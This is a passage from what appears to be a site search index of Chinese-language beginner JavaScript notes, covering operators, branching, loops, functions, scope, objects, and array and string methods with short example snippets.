||\"]},{\"header\":\"自增自减运算符\",\"slug\":\"自增自减运算符\",\"contents\":[\"++\",\"进行自增运算\",\"分成两种，前置++ 和 后置++\",\"前置++，会先把值自动 +1，再返回\",\"var a = 10 console.log(++a) // 会返回 11，并且把 a 的值变成 11 \",\"后置++，会先把值返回，再自动+1\",\"var a = 10 console.log(a++) // 会返回 10，然后把 a 的值变成 11 \",\"--\",\"进行自减运算\",\"分成两种，前置-- 和 后置--\",\"和 ++ 运算符道理一样\"]},{\"header\":\"三元运算符\",\"slug\":\"三元运算符\",\"contents\":[\"三元运算，就是用 两个符号 组成一个语句\",\"语法：\",\"条件 ? 条件为 true 的时候执行 : 条件为 false 的时候执行 \",\"例：\",\"var age = 18 age >= 18 ? alert('已经成年') : alert('没有成年') \"]}]},\"/front-end/javascript-notes/08-JavaScript%E5%9F%BA%E7%A1%80-%E5%88%86%E6%94%AF%E7%BB%93%E6%9E%84.html\":{\"title\":\"JavaScript基础-分支结构\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"分支结构可以根据条件判断真假，来选择性的执行想要的代码\",\"分支结构包含：\",\"if分支结构（重点）\",\"三元运算符\",\"switch分支结构\"]},{\"header\":\"if条件分支结构\",\"slug\":\"if条件分支结构\",\"contents\":[]},{\"header\":\"if分支结构\",\"slug\":\"if分支结构\",\"contents\":[\"语法：\",\"if(条件表达式) { // 满足条件要执行的语句 } \",\"小括号内的条件结果是布尔值，为 true 时，进入大括号里执行代码，若为 false ，则不执行大括号里面代码\",\"小括号内的结果若不是布尔类型时，会发生类型转换为布尔值，类似Boolean()\",\"如果大括号只有一个语句，大括号可以省略，但是，不提倡这样做\",\"例：\",\"// 1. 用户输入 var score = +prompt('请输入成绩') // 2. 进行判断输出 if (score >= 700) { alert('恭喜考上清华！') } \"]},{\"header\":\"if双分支结构\",\"slug\":\"if双分支结构\",\"contents\":[\"如果有两个条件的时候，可以使用 if else 双分支语句\",\"语法：\",\"if (条件表达式){ // 满足条件要执行的语句 } else { // 不满足条件要执行的语句 } \",\"例：\",\"// 1. 用户输入 var uname = prompt('请输入用户名:') var pwd = prompt('请输入密码:') // 2. 判断输出 if (uname === 'zhf' && pwd === '123456') { alert('恭喜登录成功') } else { alert('用户名或者密码错误') } \"]},{\"header\":\"if多分支结构\",\"slug\":\"if多分支结构\",\"contents\":[\"使用场景： 适合于有多个条件的时候\",\"例：\",\"// 1. 用户输入 var score = +prompt('请输入成绩：') // 2. 判断输出 if (score >= 90) { alert('成绩优秀，宝贝，你是我的骄傲') } else if (score >= 70) { alert('成绩良好，宝贝，你要加油哦~~') } else if (score >= 60) { alert('成绩及格，宝贝，你很危险~') } else { alert('成绩不及格，宝贝，我不想和你说话，我只想用鞭子和你说话~') } \"]},{\"header\":\"switch条件分支结构\",\"slug\":\"switch条件分支结构\",\"contents\":[\"使用场景： 适用于有多个条件的时候，也属于分支语句，大部分情况下和 if 多分支语句功能相同\",\"语法：\",\"switch (要判断的变量) { case 情况1: 情况1要执行的代码 break case 情况2: 情况2要执行的代码 break case 情况3: 情况3要执行的代码 break default: 上述情况都不满足的时候执行的代码 } \",\"例：根据变量给出的数字显示是星期几\",\"var week = 1 switch (week) { case 1: alert('星期一') break case 2: alert('星期二') break case 3: alert('星期三') break case 4: alert('星期四') break case 5: alert('星期五') break case 6: alert('星期六') break case 7: alert('星期日') break default: alert('请输入一个 1 ～ 7 之间的数字') } \",\"注意：\",\"switch case 语句一般用于等值判断, if 适合于区间判断\",\"switch case 一般需要配合 break 关键字使用，没有 break 会造成 case 穿透\",\"if 多分支语句开发要比 switch 更重要，使用也更多\"]},{\"header\":\"if和switch的区别\",\"slug\":\"if和switch的区别\",\"contents\":[\"共同点 \",\"都能实现多分支选择，多选一\",\"大部分情况下可以互换\",\"区别： \",\"switch…case 语句通常处理 case 为比较确定值的情况，而 if…else…语句更加灵活，通常用于范围判断(大于，等于某个范围)\",\"switch 语句进行判断后直接执行到程序的语句，效率更高，而 if…else 语句有几种判断条件，就得判断多少次\",\"switch 一定要注意必须是 === 全等，一定注意数据类型，同时注意 break 否则会有穿透效果\",\"结论： \",\"当分支比较少时，if…else 语句执行效率高\",\"当分支比较多时，switch 语句执行效率高，而且结构更清晰\"]}]},\"/front-end/javascript-notes/09-JavaScript%E5%9F%BA%E7%A1%80-%E5%BE%AA%E7%8E%AF%E7%BB%93%E6%9E%84.html\":{\"title\":\"JavaScript基础-循环结构\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"循环结构，就是根据某些给出的条件，重复的执行同一段代码\",\"循环三要素：\",\"初始值 （经常用变量）\",\"终止条件\",\"变量的变化量\"]},{\"header\":\"while循环\",\"slug\":\"while循环\",\"contents\":[\"while，中文叫当…时，其实就是当条件满足时就执行代码，一旦不满足了就不执行了\",\"语法：\",\"while (条件表达式) { // 循环体 } \",\"因为满足条件就执行，所以我们写的时候一定要注意，就是设定一个边界值，不然就一直循环下去了\",\"例：\",\"// 1. 初始值 var num = 0; // 2. 终止条件 while (num < 10) { // 3. 要执行的代码 console.log('当前的 num 的值是 ' + num) // 4. 变量的变化量 num = num + 1 } \"]},{\"header\":\"do while循环\",\"slug\":\"do-while循环\",\"contents\":[\"是一个和 while 循环类似的循环，while 会先进行条件判断，满足就执行，不满足直接就不执行了，但是 do while 循环是先不管条件，先执行一回，然后再开始进行条件判断\",\"语法：\",\"do { 要执行的代码 } while (条件) \",\"例：\",\"// 下面这个代码，条件一开始就不满足，但是依旧会执行一次 do 后面 {} 内部的代码 var num = 10 do { console.log('我执行了一次') num = num + 1 } while (num < 10) \"]},{\"header\":\"for循环\",\"slug\":\"for循环\",\"contents\":[\"语法：\",\"for(起始值; 终止条件; 变化量) { // 要重复执行的代码 } \",\"例：\",\"// 把初始化，条件判断，自身改变，写在了一起 for (var i = 1; i <= 10; i++) { // 这里写的是要执行的代码 console.log(i) } // 控制台会依次输出 1 ~ 10 \"]},{\"header\":\"for循环嵌套\",\"slug\":\"for循环嵌套\",\"contents\":[\"循环之中又嵌套了另一个循环，外层循环循环一次，里层循环循环全部\",\"例：\",\"// 1. 外面的循环 for (var i = 1; i < 4; i++) { console.log(i) // 2. 里层的循环 for (let j = 1; j < 6; j++) { console.log(j) } } \"]},{\"header\":\"break终止循环\",\"slug\":\"break终止循环\",\"contents\":[\"在循环没有进行完毕的时候，因为我设置的条件满足，提前终止循环\",\"比如：我要吃五个包子，吃到三个的时候，不能再吃了，我就停止吃包子这个事情\",\"要终止循环，就可以直接使用 break 关键字\",\"for (var i = 1; i <= 5; i++) { // 每循环一次，吃一个包子 console.log('我吃了一个包子') // 当 i 的值为 3 的时候，条件为 true，执行 {} 里面的代码终止循环 // 循环就不会继续向下执行了，也就没有 4 和 5 了 if (i === 3) { break } } \"]},{\"header\":\"continue结束本次循环\",\"slug\":\"continue结束本次循环\",\"contents\":[\"在循环中，把循环的本次跳过去，继续执行后续的循环\",\"比如：吃五个包子，到第三个的时候，第三个掉地下了，不吃了，跳过第三个，继续吃第四个和第五个\",\"跳过本次循环，就可以使用 continue 关键字\",\"for (var i = 1; i <= 5; i++) { // 当 i 的值为 3 的时候，执行 {} 里面的代码 // {} 里面有 continue，那么本次循环后面的代码就都不执行了 // 自动算作 i 为 3 的这一次结束了，去继续执行 i = 4 的那次循环了 if (i === 3) { console.log('这个是第三个包子，掉地下了，我不吃了') continue } console.log('我吃了一个包子') } \"]}]},\"/front-end/javascript-notes/10-JavaScript%E5%9F%BA%E7%A1%80-%E5%87%BD%E6%95%B0.html\":{\"title\":\"JavaScript基础-函数\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"对于 js 来说，函数就是把任意一段代码放在一个 盒子 里面\",\"在我想要让这段代码执行的时候，直接执行这个 盒子 里面的代码就行\",\"// 这个是我们以前写的一段代码 for (var i = 0; i < 10; i++) { console.log(i) } // 函数，这个 {} 就是那个 “盒子” function fn() { // 这个函数我们以前写的代码 for (var i = 0; i < 10; i++) { console.log(i) } } \"]},{\"header\":\"函数定义阶段\",\"slug\":\"函数定义阶段\",\"contents\":[\"定义阶段就是我们把代码 放在盒子里面\",\"我们就要学习怎么 放进去，也就是书写一个函数\",\"我们有两种定义方式 声明式 和 赋值式\"]},{\"header\":\"声明式\",\"slug\":\"声明式\",\"contents\":[\"使用 function 这个关键字来声明一个函数\",\"语法：\",\"function fn() { // 一段代码,即函数体 } // function: 声明函数的关键字，表示接下来是一个函数了 // fn: 函数的名字，我们自己定义的（遵循变量名的命名规则和命名规范） // (): 必须写，是用来放参数的位置（一会我们再聊） // {}: 就是我们用来放一段代码的位置（也就是我们刚才说的 “盒子”） \"]},{\"header\":\"赋值式\",\"slug\":\"赋值式\",\"contents\":[\"其实就是和我们使用 var 关键字是一个道理了\",\"首先使用 var 定义一个变量，把一个函数当作值直接赋值给这个变量就可以了\",\"语法：\",\"var fn = function () { // 一段代码，即函数体 } // 不需要在 function 后面书写函数的名字了，因为在前面已经有了 \"]},{\"header\":\"函数调用阶段\",\"slug\":\"函数调用阶段\",\"contents\":[]},{\"header\":\"函数的调用方式\",\"slug\":\"函数的调用方式\",\"contents\":[\"就是让 盒子里面 的代码执行一下\",\"两种定义函数的方式不同，但是调用函数的方式都以一样的\",\"函数调用就是直接写 函数名() 就可以了\",\"// 声明式函数 function fn() { console.log('我是 fn 函数') } fn() // 调用函数 // 赋值式函数 var fn2 = function () { console.log('我是 fn2 函数') } fn() // 调用函数 \",\"注意：定义完一个函数以后，如果没有函数调用，那么写在 {} 里面的代码没有意义，只有调用以后才会执行\"]},{\"header\":\"调用上的区别\",\"slug\":\"调用上的区别\",\"contents\":[\"虽然两种定义方式的调用都是一样的，但是还是有一些区别的\",\"声明式函数： 调用可以在定义之前或者定义之后\",\"fn() // 可以调用 // 声明式函数 function fn() { console.log('我是 fn 函数') } fn() // 可以调用 \",\"赋值式函数： 调用只能在定义之后\",\"fn() // 会报错 // 赋值式函数 var fn = function () { console.log('我是 fn 函数') } fn() // 可以调用 \"]},{\"header\":\"函数的参数\",\"slug\":\"函数的参数\",\"contents\":[\"我们在定义函数和调用函数的时候都出现过 ()，现在我们就来说一下这个 () 的作用，就是用来放参数的\",\"参数分为两种 形参 和 实参\",\"// 声明式 function fn(形参写在这里) { // 一段代码 } fn(实参写在这里) // 赋值式函数 var fn = function (形参写在这里) { // 一段代码 } fn(实参写在这里) \"]},{\"header\":\"形参和实参的作用\",\"slug\":\"形参和实参的作用\",\"contents\":[]},{\"header\":\"形参\",\"slug\":\"形参\",\"contents\":[\"形参就是在函数内部可以使用的变量，在函数外部不能使用，每写一个单词，就相当于在函数内部定义了一个可以使用的变量（遵循变量名的命名规则和命名规范），多个单词之间以 , 分隔，如果只有形参的话，那么在函数内部使用的这个变量是没有值的，也就是 undefined\",\"注意：形参的值是在函数调用的时候由实参决定的\",\"// 书写一个参数 function fn(num) { // 在函数内部就可以使用 num 这个变量 } var fn1 = function (num) { // 在函数内部就可以使用 num 这个变量 } // 书写两个参数 function fun(num1, num2) { // 在函数内部就可以使用 num1 和 num2 这两个变量 } var fun1 = function (num1, num2) { // 在函数内部就可以使用 num1 和 num2 这两个变量 } \"]},{\"header\":\"实参\",\"slug\":\"实参\",\"contents\":[\"在函数调用的时候给形参赋值的，也就是说，在调用的时候是给一个实际的内容的\",\"function fn(num) { // 函数内部可以使用 num } // 这个函数的本次调用，书写的实参是 100 // 那么本次调用的时候函数内部的 num 就是 100 fn(100) // 这个函数的本次调用，书写的实参是 200 // 那么本次调用的时候函数内部的 num 就是 200 fn(200) \",\"函数内部的形参的值，由函数调用的时候传递的实参决定，多个参数的时候，是按照顺序一一对应的\",\"function fn(num1, num2) { // 函数内部可以使用 num1 和 num2 } // 函数本次调用的时候，书写的参数是 100 和 200 // 那么本次调用的时候，函数内部的 num1 就是 100，num2 就是 200 fn(100, 200) \"]},{\"header\":\"参数个数的关系\",\"slug\":\"参数个数的关系\",\"contents\":[\"形参比实参少\",\"因为是按照顺序一一对应的\",\"形参少就会拿不到实参给的值，所以在函数内部就没有办法用到这个值\",\"function fn(num1, num2) { // 函数内部可以使用 num1 和 num2 } // 本次调用的时候，传递了两个实参，100 200 和 300 // 100 对应了 num1，200 对应了 num2，300 没有对应的变量 // 所以在函数内部就没有办法依靠变量来使用 300 这个值 fn(100, 200, 300) \",\"形参比实参多\",\"因为是按照顺序一一对应的\",\"所以多出来的形参就是没有值的，就是 undefined\",\"function fn(num1, num2, num3) { // 函数内部可以使用 num1 num2 和 num3 } // 本次调用的时候，传递了两个实参，100 和 200 // 就分别对应了 num1 和 num2 // 而 num3 没有实参和其对应，那么 num3 的值就是 undefined fn(100, 200) \"]},{\"header\":\"arguments对象\",\"slug\":\"arguments对象\",\"contents\":[\"函数内 arguments 表示它接收到的实参列表，它是一个类数组对象\",\"类数组对象：所有属性均为从 0 开始的自然数序列，并且有 length 属性，和数组类似可以用方括号书写下标访问对象的某个属性值，但是不能调用数组的方法\",\"数组的方法详见数组篇\",\"function fun() { console.log(arguments) // 11 22 33 44 console.log(arguments[0]) // 11 console.log(arguments[1]) // 22 console.log(arguments[9]) // undefined } fun(11, 22, 33, 44) \"]},{\"header\":\"函数的return\",\"slug\":\"函数的return\",\"contents\":[\"return 返回的意思，其实就是给函数一个 返回值 和 终断函数\"]},{\"header\":\"返回值\",\"slug\":\"返回值\",\"contents\":[\"函数调用本身也是一个表达式，表达式就应该有一个值出现，现在的函数执行完毕之后，是不会有结果出现的\",\"// 比如 1 + 2 是一个表达式，那么 这个表达式的结果就是 3 console.log(1 + 2) // 3 function fn() { // 执行代码 } // fn() 也是一个表达式，这个表达式就没有结果出现 console.log(fn()) // undefined \",\"return 关键字就是可以给函数执行完毕一个结果，我们可以在函数内部使用 return 把任何内容当作这个函数运行后的结果\",\"function fn() { // 执行代码 return 100 } // 此时，fn() 这个表达式执行完毕之后就有结果出现了 console.log(fn()) // 100 \"]},{\"header\":\"终断函数\",\"slug\":\"终断函数\",\"contents\":[\"当我开始执行函数以后，函数内部的代码就会从上到下的依次执行，必须要等到函数内的代码执行完毕，而 return 关键字就是可以在函数中间的位置停掉，让后面的代码不在继续执行\",\"function fn() { console.log(1) console.log(2) console.log(3) // 写了 return 以后，后面的 4 和 5 就不会继续执行了 return console.log(4) console.log(5) } // 函数调用 fn() \"]},{\"header\":\"作用域\",\"slug\":\"作用域\",\"contents\":[\"变量不是在所有地方都可以使用的，而这个变量的使用范围就是作用域\"]},{\"header\":\"全局作用域\",\"slug\":\"全局作用域\",\"contents\":[\"全局作用域是最大的作用域\",\"在全局作用域中定义的变量可以在任何地方使用\",\"页面打开的时候，浏览器会自动给我们生成一个全局作用域 window\",\"这个作用域会一直存在，直到页面关闭就销毁了\",\"// 下面两个变量都是存在在全局作用域下面的，都是可以在任意地方使用的 var num = 100 var num2 = 200 \"]},{\"header\":\"局部作用域\",\"slug\":\"局部作用域\",\"contents\":[\"局部作用域就是在全局作用域下面有开辟出来的一个相对小一些的作用域\",\"在局部作用域中定义的变量只能在这个局部作用域内部使用\",\"在 JS 中只有函数能生成一个局部作用域，别的都不行\",\"每一个函数，都是一个局部作用域\",\"// 这个 num 是一个全局作用域下的变量 在任何地方都可以使用 var num = 100 function fn() { // 下面这个变量就是一个 fn 局部作用域内部的变量 // 只能在 fn 函数内部使用 var num2 = 200 } fn() \"]},{\"header\":\"变量使用规则\",\"slug\":\"变量使用规则\",\"contents\":[\"有了作用域以后，变量就有了使用范围，也就有了使用规则，变量使用规则分为两种，访问规则 和 赋值规则\"]},{\"header\":\"访问规则\",\"slug\":\"访问规则\",\"contents\":[\"当我想获取一个变量的值的时候，我们管这个行为叫做访问\",\"获取变量的规则：\",\"首先，在自己的作用域内部查找，如果有，就直接拿来使用\",\"如果没有，就去上一级作用域查找，如果有，就拿来使用\",\"如果没有，就继续去上一级作用域查找，依次类推\",\"如果一直到全局作用域都没有这个变量，那么就会直接报错（该变量 is not defined）\",\"var num = 100 function fn() { var num2 = 200 function fun() { var num3 = 300 console.log(num3) // 自己作用域内有，拿过来用 console.log(num2) // 自己作用域内没有，就去上一级，就是 fn 的作用域里面找，发现有，拿过来用 console.log(num) // 自己这没有，去上一级 fn 那里也没有，再上一级到全局作用域，发现有，直接用 console.log(a) // 自己没有，一级一级找上去到全局都没有，就会报错 } fun() } fn() \",\"变量的访问规则 也叫做作用域的查找机制，作用域的查找机制只能是向上找，不能向下找\",\"function fn() { var num = 100 } fn() console.log(num) // 发现自己作用域没有，自己就是全局作用域，没有再上一级了，直接报错 \"]},{\"header\":\"赋值规则\",\"slug\":\"赋值规则\",\"contents\":[\"当你想给一个变量赋值的时候，那么就先要找到这个变量，再给它赋值\",\"变量赋值规则：\",\"先在自己作用域内部查找，有就直接赋值\",\"没有就去上一级作用域内部查找，有就直接赋值\",\"还没有再去上一级作用域查找，有就直接赋值\",\"如果一直找到全局作用域都没有，那么就把这个变量定义为全局变量，再给他赋值\",\"function fn() { num = 100 } fn() // fn 调用以后，要给 num 赋值 // 查看自己的作用域内部没有 num 变量 // 就会向上一级查找 // 上一级就是全局作用域，发现依旧没有 // 那么就会把 num 定义为全局的变量，并为其赋值 // 所以 fn() 以后，全局就有了一个变量叫做 num 并且值是 100 console.log(num) // 100 \"]},{\"header\":\"函数提升\",\"slug\":\"函数提升\",\"contents\":[\"声明式函数：会把所有函数声明提升到当前作用域的最前面，只提升函数声明，不提升函数调用\",\"例：\",\"以下代码\",\"fn() console.log(num) function fn() { console.log('我是 fn 函数') } var num = 100 \",\"经过预解析之后可以变形为\",\"function fn() { console.log('我是 fn 函数') } var num fn() console.log(num) num = 100 \",\"赋值式函数会按照 var 关键字的规则进行预解析\"]}]},\"/front-end/javascript-notes/11-JavaScript%E5%9F%BA%E7%A1%80-%E5%AF%B9%E8%B1%A1.html\":{\"title\":\"JavaScript基础-对象\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"对象是一个复杂数据类型\",\"事实上没有很复杂，只不过是存储了一些基本数据类型的一个集合\",\"var obj = { num: 100, str: 'hello world', boo: true } \",\"这里的 {} 和函数中的 {} 不一样，函数里面的是写代码的，而对象里面是写一些数据的，对象就是一个键值对的集合，{} 里面的每一个键都是一个成员，也就是说，我们可以把一些数据放在一个对象里面，那么他们就互不干扰了，其实就是我们准备一个房子，把我们想要的数据放进去，然后把房子的地址给到变量名，当我们需要某一个数据的时候，就可以根据变量名里面存储的地址找到对应的房子，然后去房子里面找到对应的数据\"]},{\"header\":\"创建对象\",\"slug\":\"创建对象\",\"contents\":[\"字面量的方式创建一个对象\",\"// 创建一个空对象 var obj = {} // 像对象中添加成员 obj.name = 'Jack' obj.age = 18 \",\"内置构造函数的方式创建对象\",\"// 创建一个空对象 var obj = new Object() // 向对象中添加成员 obj.name = 'Rose' obj.age = 20 \",\"Object 是 js 内置给我们的构造函数，用于创建一个对象使用的\"]}]},\"/front-end/javascript-notes/12-JavaScript%E5%9F%BA%E7%A1%80-%E6%95%B0%E7%BB%84.html\":{\"title\":\"JavaScript基础-数组\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"数组字面理解就是 数字的组合，准确的来说数组是一个 数据的集合\",\"也就是我们把一些数据放在一个盒子里面，按照顺序排好\",\"[1, 2, 3, 'hello', true, false] \"]},{\"header\":\"创建数组\",\"slug\":\"创建数组\",\"contents\":[]},{\"header\":\"字面量创建数组\",\"slug\":\"字面量创建数组\",\"contents\":[\"直接使用 [] 的方式创建一个数组\",\"// 创建一个空数组 var arr1 = [] // 创建一个有内容的数组 var arr2 = [1, 2, 3] \"]},{\"header\":\"内置构造函数创建数组\",\"slug\":\"内置构造函数创建数组\",\"contents\":[\"使用 JS 的内置构造函数 Array 创建一个数组\",\"// 创建一个空数组 var arr1 = new Array() // 创建一个长度为 10 的数组 var arr2 = new Array(10) // 创建一个有内容的数组 var arr3 = new Array(1, 2, 3) \"]},{\"header\":\"数组的长度\",\"slug\":\"数组的长度\",\"contents\":[\"length 表示数组的长度，数组里面有多少个成员，length 就是多少\",\"// 创建一个数组 var arr = [1, 2, 3] console.log(arr.length) // 3 \"]},{\"header\":\"数组的索引\",\"slug\":\"数组的索引\",\"contents\":[\"索引，也叫做下标，是指一个数据在数组里面排在第几个的位置\",\"注意： 在所有的语言里面，索引都是从 0 开始的，在 JS 里面也一样，数组的索引从 0 开始\",\"// 创建一个数组 var arr = ['hello', 'world'] \",\"上面这个数组中，第 0 个 数据就是字符串 hello，第 1 个 数据就是字符串 world，想获取数组中的第几个就使用 数组[索引] 来获取\",\"var arr = ['hello', 'world'] console.log(arr[0]) // hello console.log(arr[1]) // world \"]},{\"header\":\"数组的常用方法\",\"slug\":\"数组的常用方法\",\"contents\":[]},{\"header\":\"数组常用方法之 push\",\"slug\":\"数组常用方法之-push\",\"contents\":[\"push 是用来在数组的末尾追加一个元素\",\"var arr = [1, 2, 3] // 使用 push 方法追加一个元素在末尾 arr.push(4) console.log(arr) // [1, 2, 3, 4] \"]},{\"header\":\"数组常用方法之 pop\",\"slug\":\"数组常用方法之-pop\",\"contents\":[\"pop 是用来删除数组末尾的一个元素\",\"var arr = [1, 2, 3] // 使用 pop 方法删除末尾的一个元素 arr.pop() console.log(arr) // [1, 2] \"]},{\"header\":\"数组常用方法之 unshift\",\"slug\":\"数组常用方法之-unshift\",\"contents\":[\"unshift 是在数组的最前面添加一个元素\",\"var arr = [1, 2, 3] // 使用 unshift 方法想数组的最前面添加一个元素 arr.unshift(4) console.log(arr) // [4, 1, 2, 3] \"]},{\"header\":\"数组常用方法之 shift\",\"slug\":\"数组常用方法之-shift\",\"contents\":[\"shift 是删除数组最前面的一个元素\",\"var arr = [1, 2, 3] // 使用 shift 方法删除数组最前面的一个元素 arr.shift() console.log(arr) // [2, 3] \"]},{\"header\":\"数组常用方法之 splice\",\"slug\":\"数组常用方法之-splice\",\"contents\":[\"splice 是截取数组中的某些内容，按照数组的索引来截取\",\"语法： splice(从哪一个索引位置开始，截取多少个，替换的新元素) （第三个参数可以不写）\",\"var arr = [1, 2, 3, 4, 5] // 使用 splice 方法截取数组 arr.splice(1, 2) console.log(arr) // [1, 4, 5] \",\"arr.splice(1, 2) 表示从索引 1 开始截取 2 个内容，第三个参数没有写，就是没有新内容替换掉截取位置\",\"var arr = [1, 2, 3, 4, 5] // 使用 splice 方法截取数组 arr.splice(1, 2, '我是新内容') console.log(arr) // [1, '我是新内容', 4, 5] \",\"arr.splice(1, 2, '我是新内容') 表示从索引 1 开始截取 2 个内容，然后用第三个参数把截取完空出来的位置填充\"]},{\"header\":\"数组常用方法之 reverse\",\"slug\":\"数组常用方法之-reverse\",\"contents\":[\"reverse 是用来反转数组使用的\",\"var arr = [1, 2, 3] // 使用 reverse 方法来反转数组 arr.reverse() console.log(arr) // [3, 2, 1] \"]},{\"header\":\"数组常用方法之 sort\",\"slug\":\"数组常用方法之-sort\",\"contents\":[\"sort 是用来给数组排序的\",\"var arr = [2, 3, 1] // 使用 sort 方法给数组排序 arr.sort() console.log(arr) // [1, 2, 3] \"]},{\"header\":\"数组常用方法之 concat\",\"slug\":\"数组常用方法之-concat\",\"contents\":[\"concat 是把多个数组进行拼接\",\"和之前的方法有一些不一样的地方，就是 concat 不会改变原始数组，而是返回一个新的数组\",\"var arr = [1, 2, 3] // 使用 concat 方法拼接数组 var newArr = arr.concat([4, 5, 6]) console.log(arr) // [1, 2, 3] console.log(newArr) // [1, 2, 3, 4, 5, 6] \",\"注意： concat 方法不会改变原始数组\"]},{\"header\":\"数组常用方法之 join\",\"slug\":\"数组常用方法之-join\",\"contents\":[\"join 是把数组里面的每一项内容链接起来，变成一个字符串，可以自己定义每一项之间链接的内容 join(要以什么内容链接)，不会改变原始数组，而是把链接好的字符串返回\",\"var arr = [1, 2, 3] // 使用 join 链接数组 var str = arr.join('-') console.log(arr) // [1, 2, 3] console.log(str) // 1-2-3 \",\"注意： join 方法不会改变原始数组，而是返回链接好的字符串\"]},{\"header\":\"数组常用方法之 indexOf\",\"slug\":\"数组常用方法之-indexof\",\"contents\":[\"indexOf 用来找到数组中某一项的索引\",\"语法： indexOf(你要找的数组中的项)\",\"var arr = [1, 2, 3, 4, 5] // 使用 indexOf 超找数组中的某一项 var index = arr.indexOf(3) console.log(index) // 2 \",\"我们要找的是数组中值为 3 的那一项，返回的就是值为 3 的那一项在该数组中的索引，如果你要找的内容在数组中没有，那么就会返回 -1\",\"var arr = [1, 2, 3, 4, 5] // 使用 indexOf 超找数组中的某一项 var index = arr.indexOf(10) console.log(index) // -1 \",\"你要找的值在数组中不存在，那么就会返回 -1\"]},{\"header\":\"数组常用方法之 forEach\",\"slug\":\"数组常用方法之-foreach\",\"contents\":[\"和 for 循环一个作用，就是用来遍历数组的\",\"语法：arr.forEach(function (item, index, arr) {})\",\"var arr = [1, 2, 3] // 使用 forEach 遍历数组 arr.forEach(function (item, index, arr) { // item 就是数组中的每一项 // index 就是数组的索引 // arr 就是原始数组 console.log('数组的第 ' + index + ' 项的值是 ' + item + '，原始数组是', arr) }) \",\"forEach() 的时候传递的那个函数，会根据数组的长度执行，数组的长度是多少，这个函数就会执行多少回\"]},{\"header\":\"数组常用方法之 map\",\"slug\":\"数组常用方法之-map\",\"contents\":[\"和 forEach 类似，只不过可以对数组中的每一项进行操作，返回一个新的数组，用于处理数据\",\"var arr = [1, 2, 3] // 使用 map 遍历数组 var newArr = arr.map(function (item, index, arr) { // item 就是数组中的每一项 // index 就是数组的索引 // arr 就是原始数组 return item + 10 }) console.log(newArr) // [11, 12, 13] \"]},{\"header\":\"数组常用方法之 filter\",\"slug\":\"数组常用方法之-filter\",\"contents\":[\"和 map 的使用方式类似，按照我们的条件来筛选数组，把原始数组中满足条件的筛选出来，组成一个新的数组返回，如果没有符合条件的元素则返回空数组，它不会影响原数组\",\"var arr = [1, 2, 3] // 使用 filter 过滤数组 var newArr = arr.filter(function (item, index, arr) { // item 就是数组中的每一项 // index 就是数组的索引 // arr 就是原始数组 return item > 1 //筛选条件 }) console.log(newArr) // [2, 3] \",\"我们设置的条件就是 > 1，返回的新数组就会是原始数组中所有 > 1 的项\"]}]},\"/front-end/javascript-notes/13-JavaScript%E5%9F%BA%E7%A1%80-%E5%AD%97%E7%AC%A6%E4%B8%B2.html\":{\"title\":\"JavaScript基础-字符串\",\"contents\":[{\"header\":\"创建字符串\",\"slug\":\"创建字符串\",\"contents\":[\"我们创建字符串也分为两种方法 字面量 和 构造函数\"]},{\"header\":\"字面量\",\"slug\":\"字面量\",\"contents\":[\"var str = 'hello' \"]},{\"header\":\"构造函数创建\",\"slug\":\"构造函数创建\",\"contents\":[\"var str = new String('hello') \"]},{\"header\":\"字符集\",\"slug\":\"字符集\",\"contents\":[]},{\"header\":\"ASCII 字符集\",\"slug\":\"ascii-字符集\",\"contents\":[\"我们都知道，计算机只能存储 0101010 这样的二进制数字，那么我们的 a ~ z 、A ~ Z 、$ 、@ 之类的内容也有由二进制数字组成的，我们可以简单的理解为， a ~ z 、 A ~ Z、 $ 、 @之类的内容都有一个自己的编号，然后在计算机存储的时候，是存储的这些编号，我们看的时候，也是通过这些编号再解析成我们要看到的内容\"]},{\"header\":\"unicode 编码\",\"slug\":\"unicode-编码\",\"contents\":[\"我们看到了，ASCII 只有这 128 个字符的编码结构，但是因为 ASCII 出现的比较早，而且是美国发明的，早先时候这些内容就够用了，因为存储一些英文的内容，传递一些英文的文章什么的都够用了，那么对于这个世界来说肯定是不够用的，因为我们的汉字没有办法存储，包括一些其他国家的语言也没有办法存储，所以就出现了 unicode 编码，也叫（万国码，统一码），unicode 对照表就是一个和 ASCII 一样的对照表，只不过变得很大很大，因为存储的内容特别的多，而且包含了世界上大部分国家的文字，所以我们的文字和字符现在在存储的时候，都是按照 unicode 编码转换成数字进行存储，我们的 UTF-8 就是一种 8 位的 unicode 字符集\"]},{\"header\":\"字符串的常用方法\",\"slug\":\"字符串的常用方法\",\"contents\":[\"字符串和数组有一个相同的特点，即字符串也是按照索引来排列的\"]},{\"header\":\"charAt\",\"slug\":\"charat\",\"contents\":[\"charAt(索引) 是找到字符串中指定索引位置的内容并返回\",\"var str = 'Jack' // 使用 charAt 找到字符串中的某一个内容 var index = str.charAt(2) console.log(index) // c \",\"因为字符串也是按照索引进行排列的，也是同样从 0 开始，所以索引 2 的位置就是 c\",\"如果没有对应的索引，那么就会返回 空字符串\",\"var str = 'Jack' // 使用 charAt 找到字符串中的某一个内容 var index = str.charAt(10) console.log(index) // '' \",\"这个字符串根本没有索引 10 的位置，所以就会返回一个空字符串 ''\"]},{\"header\":\"charCodeAt\",\"slug\":\"charcodeat\",\"contents\":[\"charCodeAt(索引) 就是返回对应索引位置的 unicode 编码\",\"var str = 'Jack' // 使用 charAt 找到字符串中的某一个内容 var index = str.charCodeAt(0) console.log(index) // 74 \",\"因为 J 在 unicode 对照表里面存储的是 74，所以就会返回 74\"]},{\"header\":\"indexOf\",\"slug\":\"indexof\",\"contents\":[\"indexOf 就是按照字符找到对应的索引\",\"var str = 'Jack' // 使用 indexOf 找到对应的索引 var index = str.indexOf('J') console.log(index) // 0 \",\"因为字符 J 在字符串 Jack 中的索引位置是 0，所以会返回 0\"]},{\"header\":\"substring\",\"slug\":\"substring\",\"contents\":[\"substring 是用来截取字符串使用的\",\"语法： substring(从哪个索引开始，到哪个索引截止)，包含开始索引，不包含结束索引\",\"var str = 'hello' // 01234 // 使用 substring 截取字符串 var newStr = str.substring(1, 3) console.log(newStr) // el \",\"从索引 1 开始，到索引 3 截止，包含前面的索引不包含后面的索引，所以返回的是 el\"]},{\"header\":\"substr\",\"slug\":\"substr\",\"contents\":[\"substr 